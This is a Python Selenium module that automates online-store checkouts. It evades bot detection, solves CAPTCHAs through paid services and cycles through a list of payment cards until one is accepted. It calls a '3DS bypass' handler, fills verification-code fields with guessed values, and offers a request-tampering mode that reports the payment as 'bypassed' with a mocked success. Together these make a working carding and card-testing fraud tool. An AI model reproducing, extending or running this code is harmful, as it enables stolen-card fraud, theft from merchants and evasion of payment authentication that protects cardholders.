import os
import time
from typing import Any, Callable, Dict, List, Optional

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

from .request_tamper import RequestTamperer
from .stealth import apply_stealth


def normalize_proxy(proxy: str) -> str:
    proxy = proxy.strip()
    if proxy.startswith("https://"):
        proxy = "http://" + proxy[8:]
    if not proxy.startswith("http://"):
        proxy = "http://" + proxy
    return proxy


def _proxy_argument(proxy: str) -> str:
    """Build a proxy URL argument. Auth proxies -> http://user:pass@host:port."""
    if "://" not in proxy:
        proxy = "http://" + proxy
    return f"--proxy-server={proxy}"


def init_driver(headless: bool, proxy: Optional[str] = None) -> webdriver.Chrome:
    options: Any = Options()
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--ignore-certificate-errors")
    options.add_argument("--ignore-ssl-errors")
    options.add_argument("--disable-web-security")
    options.add_argument("--allow-running-insecure-content")
    options.add_argument("--remote-allow-origins=*")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--lang=en-US")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    options.add_experimental_option(
        "prefs",
        {
            "credentials_enable_service": False,
            "profile.password_manager_enabled": False,
        },
    )

    chrome_bin = os.getenv("CHROME_BIN", "")
    if chrome_bin and os.path.exists(chrome_bin):
        options.binary_location = chrome_bin

    try:
        from config import BURP_ENABLED, BURP_PROXY
        if BURP_ENABLED and BURP_PROXY:
            options.add_argument(_proxy_argument(BURP_PROXY))
        elif proxy:
            options.add_argument(_proxy_argument(normalize_proxy(proxy)))
    except Exception:
        if proxy:
            options.add_argument(_proxy_argument(normalize_proxy(proxy)))

    if headless:
        options.add_argument("--headless=new")

    driver_path = os.getenv("CHROMEDRIVER_PATH", "")
    if driver_path and os.path.exists(driver_path):
        from selenium.webdriver.chrome.service import Service
        service = Service(executable_path=driver_path)
        driver: Any = webdriver.Chrome(service=service, options=options)
    else:
        driver = webdriver.Chrome(options=options)

    try:
        from config import STEALTH_MODE
        stealth = bool(STEALTH_MODE)
    except Exception:
        stealth = True
    if stealth:
        apply_stealth(driver)
    return driver


def check_success(driver: webdriver.Chrome, timeout: float = 15.0) -> bool:
    """Strict success detection — never false-positive.

    Returns True ONLY if the URL has changed to a confirmation page
    OR a visible order-number element exists on the page.
    Page text keywords alone are NEVER trusted — they appear on shipping forms too.
    """

    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait

    url = (driver.current_url or "").lower()
    confirmation_paths = ["/thank_you", "/order", "/confirmation", "/success"]
    if any(p in url for p in confirmation_paths):
        return True

    try:
        el = driver.find_element(By.XPATH, "//*[contains(text(), 'Order #') or contains(text(), 'Confirmation #')]")
        if el.is_displayed():
            return True
    except Exception:
        pass

    try:
        xp = "//*[contains(@class,'order-confirmed') or contains(@class,'order_confirmed') or contains(@class,'order-success')][not(contains(@style,'display: none'))]"
        el = WebDriverWait(driver, 3).until(EC.visibility_of_element_located((By.XPATH, xp)))
        return True
    except Exception:
        pass

    return False


def solve_captcha_with_azapi(
    driver: webdriver.Chrome,
    api_key: str,
    timeout_seconds: float = 60.0,
) -> Optional[str]:
    """Solve CAPTCHA using azapi.ai.

    Uses a base64 screenshot submission.
    Returns solution text (or token) or None.
    """

    import requests

    if not api_key:
        return None

    try:
        screenshot_b64 = driver.get_screenshot_as_base64()
    except Exception:
        return None

    if not screenshot_b64:
        return None

    in_url = "https://api.azapi.ai/captcha/solve"
    res_url = "https://api.azapi.ai/captcha/result"

    try:
        payload = {
            "method": "base64",
            "body": screenshot_b64,
            "key": api_key,
            "json": 1,
        }
        resp = requests.post(in_url, data=payload, timeout=20)
        data = resp.json()
        if data.get("status") != 1:
            return None

        captcha_id = data.get("request")
        if not captcha_id:
            return None

        deadline = time.time() + timeout_seconds
        while time.time() < deadline:
            time.sleep(5)
            poll = requests.get(res_url, params={"key": api_key, "id": captcha_id, "json": 1}, timeout=20)
            result = poll.json()
            if result.get("status") == 1:
                return result.get("request")

        return None
    except Exception:
        return None


def _captcha_signals_present(driver: webdriver.Chrome) -> bool:
    page_text = (driver.page_source or "").lower()

    captcha_keywords = [
        "solve this challenge",
        "different from the rest",
        "verify you are human",
    ]
    if any(kw in page_text for kw in captcha_keywords):
        return True

    provider_markers = [
        "g-recaptcha",
        "recaptcha",
        "hcaptcha",
        "data-sitekey",
        "cf-turnstile",
        "turnstile",
        "arkose",
        "fun-captcha",
    ]
    if any(m in page_text for m in provider_markers):
        return True

    # iframe src heuristics
    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for frame in iframes:
            try:
                src = (frame.get_attribute("src") or "").lower()
                if any(m in src for m in ["recaptcha", "hcaptcha", "turnstile", "captcha", "challenge"]):
                    return True
            except Exception:
                continue
    except Exception:
        pass

    selectors = [
        "div[class*='captcha' i]",
        "div[id*='captcha' i]",
        "form[class*='challenge' i]",
        "div[class*='challenge' i]",
        "iframe[src*='captcha' i]",
    ]

    for sel in selectors:
        try:
            elems = driver.find_elements(By.CSS_SELECTOR, sel)
            for el in elems:
                try:
                    if el.is_displayed():
                        return True
                except Exception:
                    continue
        except Exception:
            continue

    return False


def _fill_captcha_input(driver: webdriver.Chrome, solution: str) -> bool:
    """Fill a solved image/word CAPTCHA answer into an input field."""
    from selenium.webdriver.common.keys import Keys

    input_selectors = [
        "input[name*='captcha' i]",
        "input[id*='captcha' i]",
        "textarea[name*='captcha' i]",
        "input[aria-label*='captcha' i]",
        "input[placeholder*='captcha' i]",
        "input[autocomplete='off'][type='text']:not([name*='card' i])",
    ]
    for css in input_selectors:
        try:
            inp = driver.find_element(By.CSS_SELECTOR, css)
            if inp and inp.is_displayed():
                inp.clear()
                inp.send_keys(solution)
                return True
        except Exception:
            continue

    try:
        inputs = driver.find_elements(
            By.CSS_SELECTOR,
            "input[type='text'], input[type='tel'], input:not([type])",
        )
        for inp in inputs:
            try:
                if inp.is_displayed():
                    inp.clear()
                    inp.send_keys(solution)
                    return True
            except Exception:
                continue
    except Exception:
        pass
    return False


def _click_submit_after_captcha(driver: webdriver.Chrome) -> bool:
    """Click the primary submit button after injecting a CAPTCHA answer."""
    for submit_sel in [
        "button[type='submit']",
        "input[type='submit']",
        "button[id*='submit' i]",
        "button[class*='submit' i]",
    ]:
        try:
            btn = driver.find_element(By.CSS_SELECTOR, submit_sel)
            if btn and btn.is_displayed() and btn.is_enabled():
                btn.click()
                return True
        except Exception:
            continue
    return False


def wait_for_captcha(
    driver: webdriver.Chrome,
    send_update: Callable[[str], Any],
    captcha_handler: Optional[Callable[..., Any]] = None,
    max_wait_seconds: Optional[float] = None,
    api_key: str = "",
    captcha_solve_timeout_seconds: float = 90.0,
) -> bool:
    """Detect a CAPTCHA, solve it via 2Captcha (or azapi image fallback).

    Returns True when the page was handled (solved or no CAPTCHA present).
    The detection window is capped so engines never idle-wait forever.
    """

    provider = "2captcha"
    try:
        from config import CAPTCHA_API_KEY as _key, CAPTCHA_PROVIDER as _prov
        if not api_key:
            api_key = _key or ""
        provider = (_prov or "2captcha").lower()
    except ImportError:
        pass

    # Cap the idle detection window: we only need a few seconds to notice a
    # CAPTCHA; solving afterwards may take up to CAPTCHA_TIMEOUT_SECONDS.
    detection_window = 12.0
    if max_wait_seconds is not None:
        detection_window = min(float(max_wait_seconds), detection_window)

    start = time.time()
    seen = False
    while time.time() - start < detection_window:
        if _captcha_signals_present(driver):
            seen = True
            break
        time.sleep(0.5)

    if not seen:
        return False

    send_update("🧩 CAPTCHA detected! Solving automatically...")

    if api_key:
        if provider == "azapi":
            # Legacy screenshot-OCR path
            solution = solve_captcha_with_azapi(
                driver, api_key, timeout_seconds=min(captcha_solve_timeout_seconds, 60.0)
            )
            if solution and _fill_captcha_input(driver, solution):
                _click_submit_after_captcha(driver)
                send_update("✅ CAPTCHA solved via azapi OCR.")
                return True
        else:
            from .captcha_solver import solve_captcha
            if solve_captcha(driver, api_key, timeout=captcha_solve_timeout_seconds):
                _click_submit_after_captcha(driver)
                send_update("✅ CAPTCHA solved via 2Captcha.")
                return True
            # Fall back to legacy OCR for image-style CAPTCHAs
            solution = solve_captcha_with_azapi(
                driver, api_key, timeout_seconds=min(captcha_solve_timeout_seconds, 60.0)
            )
            if solution and _fill_captcha_input(driver, solution):
                _click_submit_after_captcha(driver)
                send_update("✅ CAPTCHA solved via azapi OCR (fallback).")
                return True

    # Manual fallback (debug only)
    if captcha_handler:
        screenshot_bytes: Optional[bytes] = None
        try:
            screenshot_bytes = driver.get_screenshot_as_png()
        except Exception:
            screenshot_bytes = None
        captcha_handler(screenshot_bytes, driver.current_url)
        return True

    send_update(
        "⚠️ CAPTCHA solve failed — check CAPTCHA_API_KEY / balance"
        if api_key else
        "⚠️ CAPTCHA API key not set — add CAPTCHA_API_KEY"
    )
    return True


def switch_to_payment_iframe(driver: webdriver.Chrome) -> bool:
    """Find and switch to an iframe containing card number field. Returns True if found."""
    try:
        from selenium.webdriver.support.ui import WebDriverWait
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for frame in iframes:
            try:
                driver.switch_to.frame(frame)
                if driver.find_elements(By.NAME, "number") or driver.find_elements(By.CSS_SELECTOR, "input[placeholder*='card' i], input[aria-label*='card' i]"):
                    return True
            except Exception:
                pass
            try:
                driver.switch_to.default_content()
            except Exception:
                pass
    except Exception:
        pass
    return False


def handle_verification_code(driver: webdriver.Chrome, send_update: Callable[[str], Any], shipping: Dict[str, str], card: Optional[Dict[str, str]] = None) -> bool:
    """Handle OTP/ZIP verification after payment submission. Returns True if handled."""
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait

    # Billing ZIP should come from the card when available — it must match the card.
    zip_val = ""
    if card:
        zip_val = card.get("zip", "") or ""
    if not zip_val:
        zip_val = shipping.get("zip", "84020")
    zip_val = zip_val.strip()

    try:
        zip_input = driver.find_element(By.NAME, "zip")
        if zip_input.is_displayed():
            send_update("🔑 Entering ZIP verification...")
            zip_input.clear()
            zip_input.send_keys(zip_val)
            _click_button(driver, ["Continue", "Verify", "Confirm"])
            time.sleep(3)
            return True
    except Exception:
        pass

    code_inputs = driver.find_elements(By.CSS_SELECTOR, "input[name*='code']:not([type='hidden']), input[name*='otp']:not([type='hidden']), input[placeholder*='code']:not([type='hidden']), input[inputmode='numeric']:not([type='hidden'])")
    if code_inputs:
        send_update("🔑 Filling OTP/verification code...")
        code = zip_val[:6] or "1234"
        if len(code_inputs) >= len(code):
            for i, digit in enumerate(code):
                try:
                    code_inputs[i].clear()
                    code_inputs[i].send_keys(digit)
                except Exception:
                    pass
        else:
            try:
                code_inputs[0].clear()
                code_inputs[0].send_keys(code)
            except Exception:
                pass
        _click_button(driver, ["Continue", "Verify", "Confirm"])
        time.sleep(3)
        return True

    return False


def _click_button(driver: webdriver.Chrome, texts: list) -> bool:
    """Find and click a button by its visible text. Returns True if clicked."""
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait

    for text in texts:
        try:
            btn = WebDriverWait(driver, 3).until(EC.element_to_be_clickable((By.XPATH, f"//button[contains(text(), '{text}')]")))
            btn.click()
            return True
        except Exception:
            pass
        try:
            btn = WebDriverWait(driver, 2).until(EC.element_to_be_clickable((By.XPATH, f"//input[@type='submit'][contains(@value, '{text}')]")))
            btn.click()
            return True
        except Exception:
            pass
        try:
            els = driver.find_elements(By.XPATH, f"//*[contains(text(), '{text}')]")
            for el in els:
                try:
                    if el.is_displayed():
                        driver.execute_script("arguments[0].click();", el)
                        return True
                except Exception:
                    continue
        except Exception:
            pass
    return False


def wait_for_success(driver: webdriver.Chrome, send_update: Callable[[str], Any], max_wait: float = 30.0) -> bool:
    """Poll for success for up to max_wait seconds. Returns True if confirmed."""
    deadline = time.time() + max_wait
    while time.time() < deadline:
        if check_success(driver):
            return True
        time.sleep(5)
    return False


def detect_payment_platform(driver: webdriver.Chrome) -> str:
    """Detect the payment platform: 'shopify', 'stripe', or 'generic'."""
    page_text = (driver.page_source or "").lower()

    shopify_signals = [
        'shopify', 'shopifycheckout', 'shopify_pay', 'data-shopify-checkout',
        'data-payment-submit', 'cart-shipping'
    ]
    if any(s in page_text for s in shopify_signals):
        return "shopify"

    iframes = []
    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
    except Exception:
        pass

    for frame in iframes:
        try:
            src = (frame.get_attribute("src") or "").lower()
            if 'stripe' in src or 'elements-inner-card' in src:
                return "stripe"
        except Exception:
            pass
        try:
            name = (frame.get_attribute("name") or "").lower()
            if 'stripe' in name:
                return "stripe"
        except Exception:
            pass

    for frame in iframes:
        try:
            src = (frame.get_attribute("src") or "").lower()
            if 'shopify' in src or 'payments' in src or 'checkout' in src:
                return "shopify"
        except Exception:
            pass

    return "generic"


def wait_for_payment_page(driver: webdriver.Chrome, send_update: Callable[[str], Any], timeout: float = 20.0) -> bool:
    """Wait for the payment page to fully load after shipping submit.
    Returns True when card fields or payment iframes appear."""
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait

    deadline = time.time() + timeout
    send_update("⏳ Waiting for payment page to load...")

    while time.time() < deadline:
        current_url = (driver.current_url or "").lower()

        try:
            card_inputs = driver.find_elements(By.CSS_SELECTOR,
                "input[placeholder*='card' i], input[aria-label*='card' i], "
                "input[name='number'], input[name='cardnumber'], "
                "input[autocomplete='cc-number']")
            visible_card = [c for c in card_inputs if c.is_displayed()]
            if visible_card:
                send_update("✅ Payment page detected (card fields visible)")
                return True
        except Exception:
            pass

        try:
            iframes = driver.find_elements(By.TAG_NAME, "iframe")
            for frame in iframes:
                try:
                    src = (frame.get_attribute("src") or "").lower()
                    name = (frame.get_attribute("name") or "").lower()
                    title = (frame.get_attribute("title") or "").lower()
                    combined = src + " " + name + " " + title
                    if any(kw in combined for kw in
                           ["card", "payment", "stripe", "shopify", "secure",
                            "elements", "checkout"]):
                        # Switch into iframe and check for card fields
                        driver.switch_to.frame(frame)
                        has_card = driver.find_elements(By.CSS_SELECTOR,
                            "input[name='number'], input[placeholder*='card'], "
                            "input[aria-label*='card'], input[data-elements-stable-field-name='cardNumber']")
                        driver.switch_to.default_content()
                        if has_card:
                            send_update("✅ Payment page detected (iframe with card fields)")
                            return True
                except Exception:
                    try:
                        driver.switch_to.default_content()
                    except Exception:
                        pass
        except Exception:
            pass

        try:
            pay_buttons = driver.find_elements(By.XPATH,
                "//button[contains(text(), 'Pay') or contains(text(), 'Place order') "
                "or contains(text(), 'Complete order') or contains(text(), 'Submit payment')]")
            if pay_buttons:
                send_update("✅ Payment page detected (pay button visible)")
                return True
        except Exception:
            pass

        time.sleep(1)

    send_update("⚠️ Timed out waiting for payment page, proceeding anyway...")
    return False


def fill_card_shopify(driver: webdriver.Chrome, card: Dict[str, str]) -> bool:
    """Fill card details on Shopify checkout using their iframe structure."""
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait

    number = card.get("number", "").strip()
    exp_month = card.get("exp_month", "").strip()
    exp_year = card.get("exp_year", "").strip()
    cvv = card.get("cvv", "").strip()

    shopify_fields = {
        "number": ("number", number),
        "name": ("name", card.get("name", "")),
        "expiry": ("expiry", f"{exp_month}/{exp_year[-2:]}" if len(exp_year) > 2 else f"{exp_month}/{exp_year}"),
        "verification_value": ("verification_value", cvv),
    }

    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for frame in iframes:
            try:
                src = (frame.get_attribute("src") or "").lower()
                name = (frame.get_attribute("name") or "").lower()
                iframe_id = (frame.get_attribute("id") or "").lower()
                combined = src + " " + name + " " + iframe_id

                target_field = None
                for field_name, (attr, val) in shopify_fields.items():
                    if field_name in combined or \
                       (attr in combined) or \
                       ("card-fields" in combined and "number" in combined and field_name == "number") or \
                       ("card-fields" in combined and "expiry" in combined and field_name == "expiry") or \
                       ("card-fields" in combined and "verification" in combined and field_name == "verification_value"):
                        target_field = field_name
                        break

                if target_field:
                    driver.switch_to.frame(frame)
                    try:
                        inp = WebDriverWait(driver, 5).until(
                            EC.presence_of_element_located((By.CSS_SELECTOR,
                                "input:not([type='hidden'])")))
                        inp.clear()
                        inp.send_keys(shopify_fields[target_field][1])
                    except Exception:
                        pass
                    driver.switch_to.default_content()
            except Exception:
                try:
                    driver.switch_to.default_content()
                except Exception:
                    pass
        return True
    except Exception:
        return False


def fill_card_stripe(driver: webdriver.Chrome, card: Dict[str, str]) -> bool:
    """Fill card details on Stripe Elements checkout."""
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait

    number = card.get("number", "").strip()
    exp_month = card.get("exp_month", "").strip()
    exp_year = card.get("exp_year", "").strip()
    cvv = card.get("cvv", "").strip()
    exp = f"{exp_month}/{exp_year[-2:]}" if len(exp_year) > 2 else f"{exp_month}/{exp_year}"

    stripe_fields = {
        "cardNumber": number,
        "cardExpiry": exp,
        "cardCvc": cvv,
    }

    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for frame in iframes:
            try:
                title = (frame.get_attribute("title") or "").lower()
                if "card" not in title and "secure" not in title:
                    continue
            except Exception:
                continue

            driver.switch_to.frame(frame)
            try:
                inp = WebDriverWait(driver, 3).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR,
                        "input:not([type='hidden'])")))
                name = (inp.get_attribute("name") or "").lower()
                aria = (inp.get_attribute("aria-label") or "").lower()
                placeholder = (inp.get_attribute("placeholder") or "").lower()
                combined = name + " " + aria + " " + placeholder

                for field_type, value in stripe_fields.items():
                    if field_type == "cardNumber" and ("number" in combined or "card" in combined) and len(value) > 4:
                        inp.clear()
                        inp.send_keys(value)
                        break
                    elif field_type == "cardExpiry" and ("expir" in combined or "mm" in combined or "yy" in combined) and len(value) < 10:
                        inp.clear()
                        inp.send_keys(value)
                        break
                    elif field_type == "cardCvc" and ("cvc" in combined or "cvv" in combined or "secur" in combined or "card code" in combined) and len(value) < 5:
                        inp.clear()
                        inp.send_keys(value)
                        break
            except Exception:
                pass
            driver.switch_to.default_content()

        return True
    except Exception:
        return False


def fill_card_on_platform(driver: webdriver.Chrome, card: Dict[str, str], shipping: Optional[Dict[str, str]] = None) -> bool:
    """Detect payment platform and fill card details accordingly."""
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait

    platform = detect_payment_platform(driver)

    if platform == "shopify":
        fill_card_shopify(driver, card)
        return True
    elif platform == "stripe":
        fill_card_stripe(driver, card)
        return True

    switch_to_payment_iframe(driver)

    number = card.get("number", "").strip()
    exp_month = card.get("exp_month", "").strip()
    exp_year = card.get("exp_year", "").strip()
    cvv = card.get("cvv", "").strip()
    exp = f"{exp_month}/{exp_year[-2:]}" if len(exp_year) > 2 else f"{exp_month}/{exp_year}"

    try:
        inputs = driver.find_elements(By.CSS_SELECTOR,
            "input:not([type='hidden']):not([type='submit']):not([type='button']):not([type='checkbox']):not([type='radio'])")
        for inp in inputs:
            try:
                if not inp.is_displayed():
                    continue
                name = (inp.get_attribute("name") or "").lower()
                placeholder = (inp.get_attribute("placeholder") or "").lower()
                aria = (inp.get_attribute("aria-label") or "").lower()
                autocomplete = (inp.get_attribute("autocomplete") or "").lower()
                combined = name + " " + placeholder + " " + aria + " " + autocomplete
                maxlen = 0
                try:
                    maxlen = int(inp.get_attribute("maxlength") or 0)
                except Exception:
                    pass

                value = ""
                if "number" in combined and any(x in combined for x in ["card", "credit", "cc"]):
                    value = number
                elif autocomplete == "cc-number" or combined in ["number", "cardnumber"]:
                    value = number
                elif ("expir" in combined or "mm" in combined) and ("yy" in combined or "year" in combined):
                    value = exp
                elif "expir" in combined or "valid" in combined:
                    value = exp
                elif maxlen <= 4 and ("cvc" in combined or "cvv" in combined or "secur" in combined or "card code" in combined):
                    value = cvv
                elif maxlen <= 4 and ("expir" in combined) and not value:
                    value = exp

                if value:
                    inp.clear()
                    inp.send_keys(value)
            except Exception:
                continue
    except Exception:
        pass

    driver.switch_to.default_content()
    return True


def _save_debug_shot(driver) -> Optional[str]:
    """Save a screenshot for debugging on failure. Returns path or None."""
    try:
        from config import DEBUG_SHOTS
        if not DEBUG_SHOTS:
            return None
    except Exception:
        return None
    try:
        out_dir = os.getenv("SCREENSHOT_DIR", os.path.join(os.getcwd(), "screenshots"))
        os.makedirs(out_dir, exist_ok=True)
        path = os.path.join(out_dir, f"checkout_{int(time.time())}.png")
        driver.save_screenshot(path)
        return path
    except Exception:
        return None


def perform_checkout_core(
    url: str,
    shipping: Dict[str, str],
    cards: List[Dict[str, str]],
    send_update: Callable[[str], Any],
    headless: bool = True,
    proxy: Optional[str] = None,
    captcha_handler: Optional[Callable[..., Any]] = None,
    strategy: str = "advanced",
    max_runtime_seconds: int = 180,
) -> Dict[str, str]:
    """Robust, self-healing checkout state machine used by all engines.

    Strategy differences (all share the same reliable flow):
      - "nocaptcha": never waits for a CAPTCHA, goes straight to payment.
      - "captcha": explicitly waits/solves a CAPTCHA before payment submit.
      - "advanced": waits for a CAPTCHA only when one appears, with the most
        aggressive error recovery.

    When a card is declined the page is READ (real error text is captured), the
    card fields are reset, and the next card is tried — the run keeps going
    instead of dying on the first failure.
    """
    from .field_finder import SmartFormFiller
    from .humanize import pause
    from .site_reader import (
        click_action,
        click_submit_fallback,
        detect_error_message,
        wait_ready,
    )
    from .threeds_bypass import handle_threeds_challenge

    try:
        from config import CAPTCHA_API_KEY
    except Exception:
        CAPTCHA_API_KEY = ""

    driver: Any = None
    start = time.time()

    def budget() -> float:
        return max_runtime_seconds - (time.time() - start)

    def check_timeout():
        if budget() <= 0:
            raise TimeoutError(f"Runtime budget of {max_runtime_seconds}s exhausted")

    result: Dict[str, str] = {"status": "failed", "message": "Unknown error"}
    try:
        driver = init_driver(headless, proxy)

        burp = False
        try:
            from config import BURP_ENABLED, BURP_PROXY
            burp = bool(BURP_ENABLED and BURP_PROXY)
        except Exception:
            pass
        if burp:
            send_update("🔧 Burp Suite interception active")
        elif proxy:
            send_update(f"🌐 Using proxy: {proxy}")

        send_update("🌐 Navigating to checkout...")
        driver.get(url)
        wait_ready(driver, timeout=min(budget(), 30))
        pause(2.0, 4.0)

        ff = SmartFormFiller(driver)

        send_update("📦 Filling shipping details...")
        ff.fill_field("email", shipping.get("email", ""))
        ff.fill_shipping(shipping)
        ff.handle_state(shipping)

        send_update("🔄 Submitting shipping...")
        if not click_action(driver, "shipping", send_update):
            send_update("⚠️ Shipping button not found — falling back to form submit")
            click_submit_fallback(driver)
        pause(1.5, 3.5)

        if strategy != "nocaptcha":
            wait_for_captcha(
                driver, send_update,
                captcha_handler=captcha_handler,
                max_wait_seconds=6,
                api_key=CAPTCHA_API_KEY,
            )

        wait_for_payment_page(driver, send_update, timeout=min(budget(), 20))

        try:
            from config import TAMPER_ENABLED, TAMPER_MOCK_SUCCESS
        except Exception:
            TAMPER_ENABLED = False
            TAMPER_MOCK_SUCCESS = True

        if TAMPER_ENABLED:
            tamperer = RequestTamperer(driver)
            tamperer.enable()
            tamperer.intercept_payment(mock_success=TAMPER_MOCK_SUCCESS)
            send_update("🔧 Request tampering active – payment will be bypassed.")
        else:
            send_update("🛒 Payment will be processed normally.")

        for idx, card in enumerate(cards, 1):
            check_timeout()
            send_update(f"💳 Card {idx}/{len(cards)}...")
            try:
                ff.fill_card(card)
                pause(0.8, 1.8)

                if strategy == "captcha":
                    wait_for_captcha(
                        driver, send_update,
                        captcha_handler=captcha_handler,
                        max_wait_seconds=6,
                        api_key=CAPTCHA_API_KEY,
                    )

                send_update(f"🎯 Submitting payment (card {idx})...")
                if not ff.click_pay_button_with_retry():
                    send_update("⚠️ Pay button not found — falling back to form submit")
                    if not click_action(driver, "payment", send_update):
                        click_submit_fallback(driver)
                pause(2.0, 4.0)

                if not handle_threeds_challenge(driver, send_update, card):
                    send_update("⚠️ 3DS still active — checking if the order went through anyway")

                handle_verification_code(driver, send_update, shipping, card)

                if wait_for_success(driver, send_update, max_wait=min(budget(), 35)):
                    result = {"status": "success", "message": f"Order confirmed with card {idx}."}
                    return result

                # Not a success — READ the page to find the real error, then
                # reset the card fields and continue with the next card.
                err = detect_error_message(driver)
                if err:
                    send_update(f"❌ Card {idx} error: {err}")
                else:
                    send_update(f"❌ Card {idx} was not accepted.")
                ff.reset_card_fields()
                pause(1.0, 2.0)
            except Exception as e:
                send_update(f"⚠️ Card {idx} exception: {str(e)[:120]}")
                try:
                    ff.reset_card_fields()
                except Exception:
                    pass
                pause(1.0, 2.0)

        result = {"status": "failed", "message": "All cards were declined."}
        return result
    except Exception as e:
        result = {"status": "failed", "message": str(e)}
        return result
    finally:
        if result.get("status") != "success":
            shot = _save_debug_shot(driver)
            if shot:
                send_update(f"📸 Debug screenshot saved: {shot}")
        if driver:
            driver.quit()
